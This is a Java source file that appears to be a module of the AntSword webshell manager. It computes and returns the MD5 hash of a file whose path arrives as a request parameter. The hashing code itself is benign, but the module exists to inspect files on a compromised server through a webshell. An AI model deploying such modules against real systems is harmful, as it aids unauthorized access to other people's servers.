package filemanager;

import antSword.Template;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class Filehash extends Template {

    private static final int STREAM_BUFFER_LENGTH = 1024;

    @Override
    public String run() throws Exception {
        String z1 = getParam("antswordargpath");
        return FileHashCode(z1);

    }

    public static MessageDigest getMd5Digest() {
        return getDigest("MD5");
    }

    public static MessageDigest getDigest(final String algorithm) {
        try {
            return MessageDigest.getInstance(algorithm);
        } catch (final NoSuchAlgorithmException e) {
            throw new IllegalArgumentException(e);
        }
    }

    public static byte[] digest(final MessageDigest messageDigest, final InputStream data) throws IOException {
        return updateDigest(messageDigest, data).digest();
    }

    public static MessageDigest updateDigest(final MessageDigest digest, final InputStream inputStream)
            throws IOException {
        final byte[] buffer = new byte[STREAM_BUFFER_LENGTH];
        int read = inputStream.read(buffer, 0, STREAM_BUFFER_LENGTH);

        while (read > -1) {
            digest.update(buffer, 0, read);
            read = inputStream.read(buffer, 0, STREAM_BUFFER_LENGTH);
        }
        return digest;
    }

    public static byte[] md5(final InputStream data) throws IOException {
        return digest(getMd5Digest(), data);
    }

    public static String md5Hex(final InputStream data) throws IOException {
        return encodeHex(md5(data));
    }

    static String encodeHex(byte[] bytes) {
        String h = "0123456789ABCDEF";
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (int i = 0; i < bytes.length; i++) {
            sb.append(h.charAt((bytes[i] & 0xf0) >> 4));
            sb.append(h.charAt((bytes[i] & 0x0f) >> 0));
        }
        return sb.toString();
    }

    String FileHashCode(String filePath) throws Exception {
        String s = "";
        String md5s = md5Hex(new FileInputStream(filePath));
        s += "MD5\t" + md5s + "\n";
        return s;
    }
}
